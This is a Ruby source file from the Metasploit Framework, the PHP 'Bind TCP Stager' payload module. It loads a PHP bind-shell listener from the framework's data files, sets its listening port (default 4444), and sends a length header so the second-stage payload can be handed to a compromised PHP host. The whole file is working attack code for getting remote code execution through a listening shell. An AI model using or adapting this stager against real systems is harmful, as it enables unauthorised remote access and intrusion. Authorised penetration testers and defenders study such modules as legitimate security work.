##
# $Id: bind_tcp.rb 12196 2011-04-01 00:51:33Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'

module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Bind TCP Stager',
			'Version'       => '$Revision: 12196 $',
			'Description'   => 'Listen for a connection',
			'Author'        => ['egypt'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::BindTcp,
			'Stager'        => { 'Payload' => "" }
			))
	end
	def generate
		if (datastore['LPORT'] and not datastore['LPORT'].empty?)
			lport = datastore['LPORT']
		else
			lport = '4444'
		end

		bind = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'bind_tcp.php'))
		bind.gsub!("4444", lport)

		return super + bind
	end

	#
	# PHP's read functions suck, make sure they know exactly how much data to
	# grab by sending a length.
	#
	def handle_intermediate_stage(conn, payload)
		conn.put([payload.length].pack("N"))
	end
end
